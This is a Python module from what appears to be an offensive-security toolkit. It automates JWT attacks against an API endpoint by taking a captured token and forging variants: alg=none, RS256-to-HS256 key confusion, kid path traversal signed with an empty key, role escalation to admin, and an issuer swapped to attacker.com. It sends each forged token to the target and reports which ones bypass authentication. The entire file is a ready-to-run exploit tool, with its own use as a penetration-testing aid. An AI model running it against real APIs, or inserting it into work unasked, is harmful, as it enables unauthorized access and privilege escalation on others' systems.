#!/usr/bin/env python3
"""
redshift_toolkit.web.jwt_api_tester — JWT-specific attacks for API workflows.

Wraps the lower-level Module 07 `jwt_tool.py` and adds API-flow logic:
  - take a captured token + a target endpoint
  - generate a series of JWT mutations (none-alg, RS→HS confusion if public
    key supplied, kid path-traversal, expired token, audience mismatch,
    issuer manipulation)
  - send each mutation against the target and report which produced a
    non-401/403 response

Detection criterion
-------------------
A "successful" JWT attack is one where:
  - status changes from 401/403 to 200 with the mutated token, OR
  - response body changes meaningfully (different user, different fields)

Usage
-----
  python3 -m redshift_toolkit.web.jwt_api_tester \\
      --token "$TOK" --endpoint https://api.example.com/api/me
  python3 -m redshift_toolkit.web.jwt_api_tester \\
      --token "$TOK" --endpoint https://api.example.com/api/admin \\
      --rs-to-hs ./public_key.pem --json

Author: Redshift Project — Module 15 (JWT specifics)
License: MIT
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import sys
from dataclasses import dataclass, asdict, field

from redshift_toolkit.web.http_client import HttpRequest, send

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"


def paint(s: str, c: str, on: bool) -> str:
    return f"{c}{s}{RESET}" if on else s


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def parse_token(t: str) -> tuple[dict, dict, str]:
    parts = t.split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    sig = parts[2]
    return header, payload, sig


def _build_token(header: dict, payload: dict, sig_b64: str = "") -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig_b64}"


# ─── Mutations ─────────────────────────────────────────────────────────────
def mut_alg_none(header: dict, payload: dict) -> str:
    h = dict(header)
    h["alg"] = "none"
    return _build_token(h, payload, "")


def mut_alg_None_caps(header: dict, payload: dict) -> str:
    h = dict(header)
    h["alg"] = "None"
    return _build_token(h, payload, "")


def mut_rs_to_hs(header: dict, payload: dict, public_key_pem: bytes) -> str:
    h = dict(header)
    h["alg"] = "HS256"
    signing_input = (b64url_encode(json.dumps(h, separators=(",", ":")).encode())
                     + "."
                     + b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
                     ).encode()
    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    return f"{signing_input.decode()}.{b64url_encode(sig)}"


def mut_kid_traversal(header: dict, payload: dict, kid: str = "../../../../dev/null") -> str:
    h = dict(header)
    h["kid"] = kid
    h["alg"] = "HS256"
    # Sign with empty/dev-null content (= empty key)
    signing_input = (b64url_encode(json.dumps(h, separators=(",", ":")).encode())
                     + "."
                     + b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
                     ).encode()
    sig = hmac.new(b"", signing_input, hashlib.sha256).digest()
    return f"{signing_input.decode()}.{b64url_encode(sig)}"


def mut_expired(header: dict, payload: dict) -> str:
    p = dict(payload)
    p["exp"] = 1
    p["nbf"] = 0
    # Re-sign with bogus signature so it's a "valid-looking" expired token
    return _build_token(header, p, "AAAA")


def mut_audience_swap(header: dict, payload: dict, new_aud: str = "other-service") -> str:
    p = dict(payload)
    p["aud"] = new_aud
    return _build_token(header, p, "AAAA")


def mut_issuer_swap(header: dict, payload: dict, new_iss: str = "https://attacker.com/") -> str:
    p = dict(payload)
    p["iss"] = new_iss
    return _build_token(header, p, "AAAA")


def mut_role_escalate(header: dict, payload: dict) -> str:
    p = dict(payload)
    for key in ("role", "roles", "scope", "scopes", "permissions",
                "isAdmin", "is_admin", "admin", "groups"):
        if key in p:
            if isinstance(p[key], list):
                p[key] = list(p[key]) + ["admin"]
            elif isinstance(p[key], bool):
                p[key] = True
            else:
                p[key] = "admin"
    return _build_token(header, p, "AAAA")


@dataclass
class JwtFinding:
    mutation: str
    token: str
    status: int
    body_len: int
    notes: str = ""


def hit_endpoint(endpoint: str, token: str, *,
                 tls_verify: bool = True, timeout: float = 15.0
                 ) -> tuple[int, int]:
    h = [("Authorization", f"Bearer {token}")]
    r = send(HttpRequest(method="GET", url=endpoint, headers=h),
             timeout=timeout, tls_verify=tls_verify, follow_redirects=False)
    return r.status, len(r.body)


def main() -> int:
    ap = argparse.ArgumentParser(description="JWT API attack tester.")
    ap.add_argument("--token", required=True, help="captured JWT")
    ap.add_argument("--endpoint", required=True, help="API endpoint URL")
    ap.add_argument("--rs-to-hs", help="path to public key PEM (for RS→HS confusion)")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()
    color = sys.stdout.isatty() and not args.no_color and not args.json

    header, payload, _ = parse_token(args.token)

    # Baseline
    base_status, base_len = hit_endpoint(args.endpoint, args.token,
                                          tls_verify=not args.insecure,
                                          timeout=args.timeout)

    findings = [JwtFinding(mutation="baseline", token=args.token,
                            status=base_status, body_len=base_len,
                            notes="original token")]

    mutations = [
        ("alg=none", mut_alg_none(header, payload)),
        ("alg=None (caps)", mut_alg_None_caps(header, payload)),
        ("kid path traversal", mut_kid_traversal(header, payload)),
        ("expired exp=1", mut_expired(header, payload)),
        ("audience swap", mut_audience_swap(header, payload)),
        ("issuer swap", mut_issuer_swap(header, payload)),
        ("role escalate", mut_role_escalate(header, payload)),
    ]
    if args.rs_to_hs:
        with open(args.rs_to_hs, "rb") as f:
            pub = f.read()
        mutations.append(("RS→HS confusion", mut_rs_to_hs(header, payload, pub)))

    for name, t in mutations:
        try:
            s, n = hit_endpoint(args.endpoint, t,
                                 tls_verify=not args.insecure,
                                 timeout=args.timeout)
        except Exception as e:
            findings.append(JwtFinding(mutation=name, token=t,
                                        status=0, body_len=0,
                                        notes=f"error: {e}"))
            continue
        notes = ""
        if s == base_status and n == base_len:
            notes = "same as baseline (server may use this token unchanged??)"
        elif 200 <= s < 300 and base_status not in range(200, 300):
            notes = "WORKED: mutation accepted where baseline was rejected"
        elif s in (401, 403):
            notes = "rejected"
        else:
            notes = "different response — manual review"
        findings.append(JwtFinding(mutation=name, token=t,
                                    status=s, body_len=n,
                                    notes=notes))

    if args.json:
        # Don't dump full token in JSON output (PII).
        out = []
        for f in findings:
            d = asdict(f)
            d["token_prefix"] = d.pop("token")[:30] + "…"
            out.append(d)
        print(json.dumps(out, indent=2))
    else:
        print(paint("\n=== JWT mutation results ===", BOLD, color))
        for f in findings:
            tag = paint("[!]", RED, color) if "WORKED" in f.notes else " . "
            print(f"  {tag} {f.mutation:<24} status={f.status}  len={f.body_len}  "
                   f"{f.notes}")
    return 0 if not any("WORKED" in f.notes for f in findings) else 1


if __name__ == "__main__":
    sys.exit(main())
